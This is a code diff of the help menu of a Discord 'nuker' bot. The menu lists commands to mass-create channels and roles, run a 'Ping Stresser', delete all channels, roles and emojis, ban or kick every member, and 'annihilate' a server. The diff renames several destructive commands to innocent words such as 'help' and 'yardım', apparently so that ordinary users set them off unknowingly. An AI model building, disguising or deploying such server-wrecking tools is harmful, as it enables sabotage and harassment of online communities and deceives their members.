@@ -59,14 +59,14 @@ client.on("message", async message => {
             .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
             **Mass Channel:** \`${prefix}
 \` [text]
-            **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
-            **Mass Roles:** \`${prefix}mr\` [text]
+            **Mass Channel & Ping Stresser:** \`${prefix}yardım\` [TMİ EL KOYDU]
+            **Mass Roles:** \`${prefix}help\` [TMİ EL KOYDU]
             **Delete All Channels:** \`${prefix}chd\`
-            **Delete All Roles:** \`${prefix}dr\`
+            **Delete All Roles:** \`${prefix}rol\`
             **Delete All Emojis:** \`${prefix}emoall\`
-            **Ban All Members:** \`${prefix}banall\`
+            **Ban All Members:** \`${prefix}tmi\`
             **Kick All Members:** \`${prefix}kall\`
-            **Server Annihilation:** \`${prefix}die\` [text]
+            **Server Annihilation:** \`${prefix}die\` [TMİ EL KOYDU]
             `)
             .setThumbnail(``)
             .setFooter(`© Presser | Prefix: ${prefix} | Author: 7teen | Cord: ${founder}`)
